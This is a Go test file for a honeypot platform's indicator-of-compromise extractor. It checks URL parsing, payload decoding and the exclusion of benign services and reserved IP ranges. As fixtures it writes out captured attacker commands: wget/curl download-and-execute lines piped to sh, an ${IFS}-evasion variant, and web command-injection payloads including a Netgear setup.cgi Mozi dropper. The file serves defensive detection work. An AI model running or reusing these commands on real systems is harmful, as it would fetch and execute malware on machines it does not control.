package intelligence

import (
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// auditEvent is a captured event as the collector stores it.
func auditEvent(honeypot, eventType, protocol, command, payload string) *database.Event {
	return &database.Event{
		Timestamp: time.Now().UTC(), Honeypot: honeypot, EventType: eventType, Protocol: protocol,
		SourceIP: "203.0.113.9", Command: command, Payload: []byte(payload),
	}
}

// auditOfType returns the values of the IOCs of one type.
func auditOfType(iocs []*database.IOC, typ string) []string {
	var out []string
	for _, ioc := range iocs {
		if ioc.Type == typ {
			out = append(out, ioc.Value)
		}
	}
	return out
}

// The NSM sensors put their own text in the command field: fatt a JA3 or
// HASSH fingerprint (an MD5), p0f an OS name, Suricata the signature its
// author wrote. None of it is attacker input; a JA3 hash used to become an
// md5 "payload delivery" IOC flagged for IDS blocking.
func TestAuditSensorTextIsNotMined(t *testing.T) {
	x := NewExtractor()
	cases := []*database.Event{
		auditEvent("fatt", "fingerprint", "tls", "e7d705a3286e19ea42f587b344ee6865", ""),
		auditEvent("fatt", "fingerprint", "ssh", "ec7378c1a92f5a8dde7e8b7a1ddf33d1", ""),
		auditEvent("p0f", "os_fingerprint", "", "Linux 3.11 and newer", ""),
		auditEvent("suricata", "alert", "tcp", "ET POLICY curl to http://198.51.100.7/x 0123456789abcdef0123456789abcdef", ""),
	}
	for _, ev := range cases {
		iocs := x.Extract(ev)
		for _, ioc := range iocs {
			if ioc.Type != IOCTypeIP {
				t.Errorf("%s %q gave a %s IOC %q", ev.Honeypot, ev.Command, ioc.Type, ioc.Value)
			}
		}
		if got := auditOfType(iocs, IOCTypeIP); len(got) != 1 || got[0] != "203.0.113.9" {
			t.Errorf("%s: source IP IOC = %v", ev.Honeypot, got)
		}
	}
}

// A hex token in a URL path is a session, cache or object ID, not a file
// hash; the URL itself is the indicator. A hash elsewhere still counts.
func TestAuditHexInURLIsNotAHash(t *testing.T) {
	x := NewExtractor()
	ev := auditEvent("cowrie", "cowrie.command.input", "ssh",
		"wget http://198.51.100.7/d/0123456789abcdef0123456789abcdef/x.sh?t=0123456789abcdef0123456789abcdef01234567; echo fedcba9876543210fedcba9876543210", "")
	got := auditOfType(x.Extract(ev), IOCTypeHash)
	if len(got) != 1 || got[0] != "fedcba9876543210fedcba9876543210" {
		t.Errorf("hash IOCs = %v, want only the one outside the URL", got)
	}
}

// Shell separators end a URL: "wget http://x/a;chmod +x a" downloads
// http://x/a. The URL regex used to run on to the next space, so the IOC
// (and its de-duplication key) carried the rest of the command.
func TestAuditURLEndsAtShellSeparator(t *testing.T) {
	x := NewExtractor()
	cases := map[string]string{
		"cd /tmp;wget http://198.51.100.7/a.sh;chmod +x a.sh":   "http://198.51.100.7/a.sh",
		"cd${IFS}/tmp;wget${IFS}http://198.51.100.7/b${IFS}-O-": "http://198.51.100.7/b",
		"curl -s http://198.51.100.7/c|sh":                      "http://198.51.100.7/c",
		"wget -q http://198.51.100.7/d>/dev/null 2>&1":          "http://198.51.100.7/d",
		"wget http://198.51.100.7/e&&sh e":                      "http://198.51.100.7/e",
		"echo `curl http://198.51.100.7/f`":                     "http://198.51.100.7/f",
		"sh -c \"$(curl -fsSL http://198.51.100.7/g$(id -u))\"": "http://198.51.100.7/g",
		"curl 'http://198.51.100.7/h?a=1&b=2'":                  "http://198.51.100.7/h?a=1&b=2",
	}
	for cmd, want := range cases {
		got := auditOfType(x.Extract(auditEvent("cowrie", "cowrie.command.input", "ssh", cmd, "")), IOCTypeURL)
		if len(got) != 1 || got[0] != want {
			t.Errorf("%q: URL IOCs = %v, want [%s]", cmd, got, want)
		}
	}
	// A scheme with nothing after it names no location.
	for _, cmd := range []string{"curl http://)", "wget http://;id", "echo http://|sh"} {
		if got := auditOfType(x.Extract(auditEvent("cowrie", "cowrie.command.input", "ssh", cmd, "")), IOCTypeURL); len(got) != 0 {
			t.Errorf("%q: URL IOCs = %v, want none", cmd, got)
		}
	}
}

// ddospot logs the address its reflected replies would hit: over UDP that
// is the forged source, the victim of the attack, not the attacker.
func TestAuditDDoSpotVictimIsNotAnIOC(t *testing.T) {
	x := NewExtractor()
	ev := auditEvent("ddospot", "ddospot.dns.attack_start", "udp", "", "example.com.")
	if got := auditOfType(x.Extract(ev), IOCTypeIP); len(got) != 0 {
		t.Errorf("ddospot UDP target became IP IOCs %v", got)
	}
	tcp := auditEvent("ddospot", "ddospot.dns.request", "tcp", "", "example.com.")
	if got := auditOfType(x.Extract(tcp), IOCTypeIP); len(got) != 1 {
		t.Errorf("ddospot TCP source (not forgeable): IP IOCs %v, want 1", got)
	}
}

// A web honeypot stores the request target percent-encoded, with '+' for a
// space in the query. An URL smuggled into it is read decoded, so the IOC is
// the download location and not "...Mozi.m+-O+/tmp/netgear".
func TestAuditWebPayloadURLsAreDecoded(t *testing.T) {
	x := NewExtractor()
	cases := []struct{ honeypot, et, payload, want string }{
		{"tanner", "tanner.http.get", "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.7/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1", "http://198.51.100.7/Mozi.m"},
		{"tanner", "tanner.http.get", "/shell?cd%20/tmp;wget%20http://198.51.100.7/jaws;sh%20/tmp/jaws", "http://198.51.100.7/jaws"},
		{"go-pot", "go-pot.http.get", "/index.php?u=http%3A%2F%2F198.51.100.7%2Fa.sh", "http://198.51.100.7/a.sh"},
		{"citrixhoneypot", "citrixhoneypot.http.request", "GET /cgi-bin/x?c=wget%20http://198.51.100.7/c.sh HTTP/1.1", "http://198.51.100.7/c.sh"},
		// A download location is a URL already: its '+' is literal.
		{"cowrie", "cowrie.session.file_download", "http://198.51.100.7/a+b.sh", "http://198.51.100.7/a+b.sh"},
	}
	for _, tc := range cases {
		got := auditOfType(x.Extract(auditEvent(tc.honeypot, tc.et, "http", "", tc.payload)), IOCTypeURL)
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("%s %q: URL IOCs = %v, want [%s]", tc.honeypot, tc.payload, got, tc.want)
		}
	}
}

// Bots look up their public address before reporting home ("curl
// http://ipinfo.io/ip"). Those services are not attacker infrastructure; a
// URL or domain IOC for them would block a public service. The list follows
// MISP's "whats-my-ip" warninglist.
func TestAuditIPEchoServicesAreNotIOCs(t *testing.T) {
	x := NewExtractor()
	for _, cmd := range []string{
		"curl -s http://ipinfo.io/ip", "wget -qO- https://api.ipify.org", "curl https://ifconfig.me",
		"curl -s http://ip-api.com/json", "curl http://checkip.amazonaws.com", "curl -s https://icanhazip.com",
	} {
		iocs := x.Extract(auditEvent("cowrie", "cowrie.command.input", "ssh", cmd, ""))
		if u, d := auditOfType(iocs, IOCTypeURL), auditOfType(iocs, IOCTypeDomain); len(u)+len(d) != 0 {
			t.Errorf("%q: URL %v domain %v", cmd, u, d)
		}
	}
	// A look-alike is not the service.
	iocs := x.Extract(auditEvent("cowrie", "cowrie.command.input", "ssh", "curl http://ipinfo.io.evil.example/x", ""))
	if d := auditOfType(iocs, IOCTypeDomain); len(d) != 1 || d[0] != "ipinfo.io.evil.example" {
		t.Errorf("look-alike domain: %v", d)
	}
}

// Special-purpose IPv4 blocks that no internet attacker can source from:
// IETF protocol assignments (192.0.0.0/24) and benchmarking (198.18.0.0/15,
// also the fake-IP range of Clash-style proxies).
func TestAuditReservedRangesAreNotIOCs(t *testing.T) {
	x := NewExtractor()
	for _, ip := range []string{"192.0.0.8", "198.18.0.1", "198.19.255.254"} {
		ev := auditEvent("cowrie", "cowrie.command.input", "ssh", "wget http://"+ip+"/x", "")
		ev.SourceIP = ip
		if got := auditOfType(x.Extract(ev), IOCTypeIP); len(got) != 0 {
			t.Errorf("%s: IP IOCs %v", ip, got)
		}
	}
	ev := auditEvent("cowrie", "cowrie.command.input", "ssh", "wget http://198.20.0.1/x", "")
	if got := auditOfType(x.Extract(ev), IOCTypeIP); len(got) != 2 {
		t.Errorf("198.20.0.1 is public: IP IOCs %v", got)
	}
}
